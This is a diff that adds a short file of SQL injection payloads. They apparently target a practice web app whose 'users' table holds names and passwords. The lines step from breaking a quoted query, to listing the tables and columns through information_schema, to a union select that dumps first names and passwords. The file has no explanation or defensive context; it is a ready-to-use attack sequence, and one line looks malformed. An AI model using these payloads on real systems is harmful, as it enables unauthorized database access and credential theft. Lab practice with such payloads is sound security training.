@@ -1,0 +1,8 @@
+1'
+1'#
+1' union select null,database() #
+1'(select case when (select users()) then 0 else 1 end )#
+1' union select null,table_name from information_schema.tables #
+1' union select null,table_name from information_schema.tables where table_schema = 'users' #
+1' union select null,concat(0x0a,column_name) from information_schema.columns where table_name= 'users' #
+1' union select null,concat(first_name,0x0a,password) from users #
